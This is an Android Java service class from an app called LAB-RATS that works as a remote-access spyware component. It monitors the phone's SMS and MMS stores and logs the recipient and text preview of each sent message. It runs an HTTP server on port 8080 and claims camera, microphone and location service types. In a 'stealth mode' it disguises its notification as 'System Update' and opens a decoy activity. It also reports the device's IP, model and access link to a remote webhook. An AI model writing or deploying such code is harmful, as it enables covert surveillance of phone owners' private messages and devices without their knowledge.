package com.labs.labrats;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import android.net.ConnectivityManager;
import android.net.LinkProperties;
import android.net.Network;
import android.net.Uri;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.os.Looper;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class HttpServerService extends Service {

    private static final String TAG = "HttpServerService";
    private static final String CHANNEL_ID = "LabRATS-Channel";
    private static final int NOTIFICATION_ID = 1;
    public static boolean isRunning = false;

    // URL is now loaded from local.properties via BuildConfig
    private static final String REMOTE_WEBHOOK_URL = BuildConfig.WEBHOOK_URL;

    private LabRatsHttpServer server;
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private String lastReportedIp = "";
    private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
    private ContentObserver messageObserver;
    private boolean isForeground = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        ensureForeground();
        connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        registerNetworkCallback();
        registerMessageObserver();
        checkAndReportIp(); // Initial check
    }

    private void registerMessageObserver() {
        try {
            messageObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
                private long lastSmsId = -1;
                private long lastMmsId = -1;

                @Override
                public void onChange(boolean selfChange, Uri uri) {
                    super.onChange(selfChange, uri);
                    networkExecutor.execute(() -> {
                        checkNewSms();
                        checkNewMms();
                    });
                }

                private void checkNewSms() {
                    Cursor cursor = null;
                    try {
                        // Query all SMS, sorted by date. Check if the most recent one is 'sent' (type 2)
                        cursor = getContentResolver().query(Uri.parse("content://sms"), 
                                new String[]{"_id", "address", "body", "type"}, null, null, "date DESC LIMIT 1");
                        
                        if (cursor != null && cursor.moveToFirst()) {
                            long id = cursor.getLong(0);
                            int type = cursor.getInt(3);
                            if (id != lastSmsId) {
                                if (type == 2) { // 2 = MESSAGE_TYPE_SENT
                                    String address = cursor.getString(1);
                                    String body = cursor.getString(2);
                                    String preview = (body != null && body.length() > 30) ? body.substring(0, 27) + "..." : body;
                                    LabRatsHttpServer.logActivity("COMMS_SENT: [SMS/RCS to " + address + "] " + preview);
                                }
                                lastSmsId = id;
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error checking sent SMS: " + e.getMessage());
                    } finally {
                        if (cursor != null) cursor.close();
                    }
                }

                private void checkNewMms() {
                    Cursor cursor = null;
                    try {
                        // msg_box 2 = SENT
                        cursor = getContentResolver().query(Uri.parse("content://mms"), 
                                new String[]{"_id", "msg_box"}, null, null, "date DESC LIMIT 1");
                        
                        if (cursor != null && cursor.moveToFirst()) {
                            long id = cursor.getLong(0);
                            int msgBox = cursor.getInt(1);
                            if (id != lastMmsId) {
                                if (msgBox == 2) {
                                    LabRatsHttpServer.logActivity("COMMS_SENT: [MMS media dispatched]");
                                }
                                lastMmsId = id;
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error checking sent MMS: " + e.getMessage());
                    } finally {
                        if (cursor != null) cursor.close();
                    }
                }
            };

            getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, messageObserver);
            getContentResolver().registerContentObserver(Uri.parse("content://mms"), true, messageObserver);
            Log.d(TAG, "Message observer registered for bi-directional tracking");
        } catch (Exception e) {
            Log.e(TAG, "Failed to register message observer: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;

        if (!isForeground) {
            ensureForeground();
        }

        if ("START".equals(action)) {
            startServer();
        }
else if ("STOP".equals(action)) {
            stopServer();
            stopForeground(true);
            stopSelf();
        }

        return START_NOT_STICKY;
    }

    private void ensureForeground() {
        // Check if we have permissions before attempting to start as FGS with specific types
        boolean hasFineLocation = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED;
        boolean hasCoarseLocation = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED;
        boolean hasCamera = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED;
        boolean hasMic = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED;

        Notification notification = createNotification();
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                int serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                
                if (hasFineLocation || hasCoarseLocation) {
                    serviceType |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
                }
                
                // Add Camera and Microphone types to allow starting other services with these types from background
                if (hasCamera) {
                    serviceType |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
                }
                if (hasMic) {
                    serviceType |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
                }

                startForeground(NOTIFICATION_ID, notification, serviceType);
                isForeground = true;
            } else {
                startForeground(NOTIFICATION_ID, notification);
                isForeground = true;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting foreground: " + e.getMessage());
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                try {
                    startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
                    isForeground = true;
                } catch (Exception e2) {
                    Log.e(TAG, "Critical failure starting foreground", e2);
                    isForeground = false;
                }
            } else {
                isForeground = false;
            }
        }
    }

    private synchronized void startServer() {
        try {
            if (server == null || !server.isAlive()) {
                server = new LabRatsHttpServer(this, 8080);
                server.start();
                isRunning = true;
                Log.d(TAG, "HTTP Server started on port 8080");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start server", e);
            isRunning = false;
        }
    }

    private synchronized void stopServer() {
        try {
            isRunning = false;
            if (server != null) {
                // Stop server in background to avoid blocking main thread if called from UI
                final LabRatsHttpServer serverToStop = server;
                server = null;
                new Thread(() -> {
                    try {
                        if (serverToStop.isAlive()) {
                            serverToStop.stop();
                        }
                        Log.d(TAG, "HTTP Server stopped successfully");
                    } catch (Exception e) {
                        Log.e(TAG, "Error stopping server in thread", e);
                    }
                }).start();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in stopServer", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "LAB-RATS Server",
                    NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("HTTP Server running");

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private boolean isStealthMode() {
        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
        return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
    }

    private Notification createNotification() {
        boolean stealth = isStealthMode();
        
        Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);

        String ip = MainActivity.getLocalIpAddress();
        String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
        
        String title = stealth ? "System Update" : "🛡️ LAB-RATS Active";
        String contentText;
        
        if (stealth) {
            contentText = "Checking for system updates...";
        } else {
            contentText = ip != null
                ? "Server running at http://" + formattedIp + ":8080"
                : "Server running on port 8080";
        }

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(contentText)
                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.app_logo)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        unregisterNetworkCallback();
        if (messageObserver != null) {
            getContentResolver().unregisterContentObserver(messageObserver);
        }
        stopServer();
        networkExecutor.shutdownNow();
        super.onDestroy();
    }

    private void registerNetworkCallback() {
        if (connectivityManager != null) {
            try {
                networkCallback = new ConnectivityManager.NetworkCallback() {
                    @Override
                    public void onLinkPropertiesChanged(Network network, LinkProperties linkProperties) {
                        super.onLinkPropertiesChanged(network, linkProperties);
                        checkAndReportIp();
                    }
                };
                connectivityManager.registerDefaultNetworkCallback(networkCallback);
            } catch (Exception e) {
                Log.e(TAG, "Failed to register network callback", e);
            }
        }
    }

    private void unregisterNetworkCallback() {
        if (connectivityManager != null && networkCallback != null) {
            try {
                connectivityManager.unregisterNetworkCallback(networkCallback);
                networkCallback = null;
            } catch (Exception e) {
                Log.e(TAG, "Error unregistering network callback", e);
            }
        }
    }

    private void checkAndReportIp() {
        if (networkExecutor.isShutdown()) return;
        
        // MainActivity.getPublicIPv6Async handles the threading internally,
        // but we want to ensure we don't spam.
        MainActivity.getPublicIPv6Async(publicIp -> {
            if (networkExecutor.isShutdown()) return;
            
            String localIp = MainActivity.getLocalIpAddress();
            String currentIp = (localIp != null) ? localIp : publicIp;

            if (currentIp != null && !currentIp.equals(lastReportedIp)) {
                Log.d(TAG, "IP Changed or Initial Report: " + currentIp);
                if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
                    // Send in background thread as network operations are involved
                    try {
                        networkExecutor.execute(() -> sendIpToWebhook(currentIp));
                    } catch (Exception e) {
                        Log.e(TAG, "Executor error", e);
                    }
                }
                lastReportedIp = currentIp;
            }
        });
    }

    private void sendIpToWebhook(String ip) {
        try {
            URL url = new URL(REMOTE_WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");

            // Send JSON with IP, Port, Device Info, and Link
            String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
            String link = "http://" + formattedIp + ":8080";
            
            // Add extra info to help diagnose connection issues
            String networkType = "Unknown";
            if (connectivityManager != null) {
                android.net.Network activeNetwork = connectivityManager.getActiveNetwork();
                android.net.NetworkCapabilities caps = connectivityManager.getNetworkCapabilities(activeNetwork);
                if (caps != null) {
                    if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)) networkType = "WiFi";
                    else if (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)) networkType = "Cellular";
                }
            }

            String jsonInputString = "{\"ip\": \"" + ip + "\", \"port\": 8080, \"device\": \"" + Build.MODEL
                    + "\", \"network\": \"" + networkType + "\", \"link\": \"" + link + "\"}";

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int code = conn.getResponseCode();
            Log.d(TAG, "Report IP Response Code: " + code);

        } catch (Exception e) {
            Log.e(TAG, "Failed to report IP: " + e.getMessage());
        }
    }
}
